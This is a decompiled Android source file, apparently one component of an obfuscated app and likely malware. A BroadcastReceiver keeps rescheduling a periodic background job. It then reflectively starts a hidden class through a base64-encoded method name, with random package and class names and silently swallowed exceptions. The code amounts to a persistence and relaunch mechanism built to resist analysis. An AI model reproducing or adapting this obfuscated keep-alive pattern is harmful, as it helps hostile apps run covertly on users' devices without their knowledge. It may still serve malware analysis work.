package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.octilmzbubuyxuwoatjjegoftxnqvqtfteebqbnaezstcjedsw5;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0044c;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
/* loaded from: classes.dex */
public class hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq7 extends BroadcastReceiver {
    /* renamed from: a */
    public static void m96a(Context context) {
        JobInfo.Builder builder;
        long j;
        JobScheduler jobScheduler = (JobScheduler) context.getSystemService("jobscheduler");
        ComponentName componentName = new ComponentName(context, hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq7_WKJ.class);
        if (Build.VERSION.SDK_INT >= 24) {
            builder = new JobInfo.Builder(100, componentName);
            j = 900000;
        } else {
            builder = new JobInfo.Builder(100, componentName);
            j = 15000;
        }
        jobScheduler.schedule(builder.setPeriodic(j).build());
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Class<?> cls;
        Object obj;
        try {
            m96a(context);
            if (C0044c.m239g(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.class, context)) {
                Intent intent2 = new Intent(context, hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.class);
                Method method = null;
                try {
                    cls = Class.forName("com.ak47.raaghrvcnnpmoertfxcstbceefuwbgrtqtnkkgajfwyisfzuwa9");
                } catch (ClassNotFoundException unused) {
                    cls = null;
                }
                try {
                    obj = cls.newInstance();
                } catch (IllegalAccessException | InstantiationException unused2) {
                    obj = null;
                }
                try {
                    method = cls.getDeclaredMethod(C0045d.m214n("U3RhcnROZXdTY2Fu"), Context.class, Intent.class);
                } catch (NoSuchMethodException unused3) {
                }
                method.invoke(obj, context, intent2);
            }
        } catch (IllegalAccessException | InvocationTargetException | Exception unused4) {
        }
    }
}
